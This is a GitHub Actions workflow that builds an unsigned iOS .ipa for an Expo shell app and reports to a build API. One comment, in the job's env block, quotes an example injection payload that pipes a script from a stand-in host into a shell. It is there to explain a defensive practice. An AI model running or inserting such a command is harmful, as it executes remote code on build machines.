name: build-ipa
run-name: build ${{ inputs.buildId || 'test' }}

on:
  workflow_dispatch:
    inputs:
      buildId:
        description: "Build id (apps/api builds row). Leave empty when useTestConfig is true."
        required: false
        type: string
      buildTokenEnc:
        description: "AES-256-GCM-encrypted one-off bearer token for this build (apps/api encrypts it with BUILD_TOKEN_KEY before dispatch — the raw token never appears in a workflow input). Leave empty when useTestConfig is true."
        required: false
        type: string
      baseUrl:
        description: "apps/api base URL this runner calls back into — must start with https://. Leave empty when useTestConfig is true."
        required: false
        type: string
      useTestConfig:
        description: "Use apps/shell/test/test.config.json instead of calling apps/api"
        required: false
        type: boolean
        default: true

jobs:
  build:
    runs-on: macos-latest
    # Job-level, not per-step: every later step reads these via plain shell variables
    # ($BUILD_ID/$BASE_URL/$BUILD_TOKEN_ENC), never via a raw ${{ inputs.* }} expansion
    # inside a `run:` block. That distinction matters — `${{ }}` is substituted into the
    # step's script text before the shell ever sees it, so a value containing shell
    # metacharacters (e.g. a crafted buildId like `$(curl evil.sh | sh)`) would execute as
    # part of the script itself. Routed through env instead, the same value is just an
    # opaque string in a variable — the shell never re-parses it as code. buildTokenEnc is
    # ciphertext (useless without BUILD_TOKEN_KEY), so unlike the decrypted token below it
    # doesn't need masking.
    env:
      BUILD_ID: ${{ inputs.buildId }}
      BASE_URL: ${{ inputs.baseUrl }}
      BUILD_TOKEN_ENC: ${{ inputs.buildTokenEnc }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version-file: package.json
          cache: npm

      # First step after setup-node, before anything else touches the token: decrypts
      # buildTokenEnc with the BUILD_TOKEN_KEY secret (same key apps/api encrypted it
      # with), masks the plaintext immediately, then writes it to $GITHUB_ENV so every
      # later step gets it as a plain $BUILD_TOKEN shell variable — never re-interpolated
      # from `inputs.*` or `secrets.*` again after this point.
      - name: Decrypt build token
        if: ${{ inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        env:
          BUILD_TOKEN_KEY: ${{ secrets.BUILD_TOKEN_KEY }}
        run: |
          DECRYPTED=$(node .github/scripts/decrypt-build-token.mjs)
          echo "::add-mask::$DECRYPTED"
          echo "BUILD_TOKEN=$DECRYPTED" >> "$GITHUB_ENV"

      - name: Validate inputs (real build only)
        if: ${{ inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        run: |
          if [ -z "$BUILD_ID" ] || [ -z "$BUILD_TOKEN_ENC" ] || [ -z "$BASE_URL" ]; then
            echo "buildId/buildTokenEnc/baseUrl are required when useTestConfig is false" >&2
            exit 1
          fi
          case "$BASE_URL" in
            https://*) ;;
            *) echo "baseUrl must start with https://, got: $BASE_URL" >&2; exit 1 ;;
          esac

      - name: Install dependencies
        run: npm ci

      - name: Select Xcode (Expo SDK 57 needs Xcode 26.4+)
        run: |
          LATEST_XCODE=$(ls -d /Applications/Xcode_*.app | sort -V | tail -1)
          echo "Selecting $LATEST_XCODE"
          sudo xcode-select -s "$LATEST_XCODE"
          xcodebuild -version

      - name: Report build started
        if: ${{ inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        env:
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          node -e "
            require('fs').writeFileSync('start-report.json', JSON.stringify({
              runId: ${{ github.run_id }},
              runUrl: process.env.RUN_URL,
            }));
          "
          curl -fsS -X POST \
            -H "Authorization: Bearer $BUILD_TOKEN" -H "Content-Type: application/json" \
            --data-binary @start-report.json \
            "$BASE_URL/builds/$BUILD_ID/start"

      - name: Fetch project config (test fixture)
        if: ${{ inputs.useTestConfig == true || inputs.useTestConfig == 'true' }}
        run: |
          cp apps/shell/test/test.config.json apps/shell/project.config.json
          cp apps/shell/test/test-icon.png apps/shell/assets/project-icon.png

      - name: Fetch project config (apps/api)
        if: ${{ inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        run: |
          curl -fsS -H "Authorization: Bearer $BUILD_TOKEN" \
            "$BASE_URL/builds/$BUILD_ID/config" -o build-config.json
          node -e "console.log(JSON.stringify(JSON.parse(require('fs').readFileSync('build-config.json','utf8')).config))" \
            > apps/shell/project.config.json
          curl -fsS -H "Authorization: Bearer $BUILD_TOKEN" \
            "$BASE_URL/builds/$BUILD_ID/icon" -o apps/shell/assets/project-icon.png

      - name: Bake config into the shell
        run: |
          cp apps/shell/project.config.json apps/shell/src/config/generated.config.json
          echo "CONFIG_PATH=$GITHUB_WORKSPACE/apps/shell/project.config.json" >> "$GITHUB_ENV"
          echo "ICON_PATH=$GITHUB_WORKSPACE/apps/shell/assets/project-icon.png" >> "$GITHUB_ENV"
          echo "Resolved config:"
          cat apps/shell/project.config.json

      - name: Prebuild iOS project
        working-directory: apps/shell
        run: npx expo prebuild --platform ios --clean

      - name: Cache CocoaPods
        uses: actions/cache@v4
        with:
          path: |
            apps/shell/ios/Pods
            ~/Library/Caches/CocoaPods
          key: ${{ runner.os }}-pods-${{ hashFiles('apps/shell/ios/Podfile') }}
          restore-keys: |
            ${{ runner.os }}-pods-

      - name: Pod install
        working-directory: apps/shell/ios
        run: pod install

      - name: Determine workspace and scheme
        working-directory: apps/shell/ios
        run: |
          WORKSPACE=$(ls -d *.xcworkspace | head -1)
          # Expo/CocoaPods workspaces also expose per-pod schemes (e.g. "EXConstants") via
          # `xcodebuild -list`, so picking "the first scheme" is unreliable. The app's own
          # scheme is always named after the generated Xcode project, which matches the
          # workspace's base name for a fresh single-target Expo prebuild.
          SCHEME="${WORKSPACE%.xcworkspace}"
          echo "WORKSPACE=$WORKSPACE" >> "$GITHUB_ENV"
          echo "SCHEME=$SCHEME" >> "$GITHUB_ENV"
          echo "Workspace: $WORKSPACE / Scheme: $SCHEME"

      - name: Archive (unsigned)
        working-directory: apps/shell/ios
        run: |
          set -o pipefail
          xcodebuild archive \
            -workspace "$WORKSPACE" \
            -scheme "$SCHEME" \
            -configuration Release \
            -sdk iphoneos \
            -destination 'generic/platform=iOS' \
            -archivePath "$PWD/build/App.xcarchive" \
            CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGNING_IDENTITY="" \
            2>&1 | tee "$GITHUB_WORKSPACE/build.log"

      - name: Package .ipa
        id: package
        run: |
          APP_PATH=$(find apps/shell/ios/build/App.xcarchive/Products/Applications -maxdepth 1 -name "*.app" | head -1)
          SLUG=$(node -pe "JSON.parse(require('fs').readFileSync(process.env.CONFIG_PATH,'utf8')).slug")
          mkdir -p Payload
          cp -r "$APP_PATH" Payload/
          zip -qr "${SLUG}.ipa" Payload
          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
          echo "app_path=$APP_PATH" >> "$GITHUB_OUTPUT"
          echo "ipa_path=$GITHUB_WORKSPACE/${SLUG}.ipa" >> "$GITHUB_OUTPUT"

      - name: Verify .ipa
        run: |
          IPA_PATH="${{ steps.package.outputs.ipa_path }}"
          APP_PATH="${{ steps.package.outputs.app_path }}"
          echo "IPA size: $(du -h "$IPA_PATH" | cut -f1)"
          echo "CFBundleDisplayName: $(/usr/libexec/PlistBuddy -c 'Print :CFBundleDisplayName' "$APP_PATH/Info.plist")"
          echo "CFBundleIdentifier: $(/usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$APP_PATH/Info.plist")"
          PROJECT_NAME=$(node -pe "JSON.parse(require('fs').readFileSync(process.env.CONFIG_PATH,'utf8')).name")
          if grep -a -q "$PROJECT_NAME" "$APP_PATH/main.jsbundle" 2>/dev/null; then
            echo "generated.config.json content found baked into main.jsbundle"
          else
            echo "::warning::Could not confirm config content inside main.jsbundle (informational only, Hermes bytecode layout may not preserve a plain grep match)"
          fi

      - name: Upload .ipa artifact
        if: always() && steps.package.outputs.ipa_path != ''
        uses: actions/upload-artifact@v4
        with:
          name: ipa
          path: |
            ${{ steps.package.outputs.ipa_path }}
            build.log
          retention-days: 14

      - name: Upload .ipa to apps/api
        if: ${{ success() && inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        run: |
          curl --fail -X POST \
            -H "Authorization: Bearer $BUILD_TOKEN" -H "Content-Type: application/octet-stream" \
            --data-binary "@${{ steps.package.outputs.ipa_path }}" \
            "$BASE_URL/builds/$BUILD_ID/ipa"

      - name: Report failure to apps/api
        if: ${{ failure() && inputs.useTestConfig != true && inputs.useTestConfig != 'true' }}
        run: |
          export LOG_TAIL=$(tail -n 50 build.log 2>/dev/null || echo "no build.log captured")
          node -e "
            require('fs').writeFileSync('failure-report.json', JSON.stringify({ error: process.env.LOG_TAIL }));
          "
          curl -fsS -X POST \
            -H "Authorization: Bearer $BUILD_TOKEN" -H "Content-Type: application/json" \
            --data-binary @failure-report.json \
            "$BASE_URL/builds/$BUILD_ID/fail"
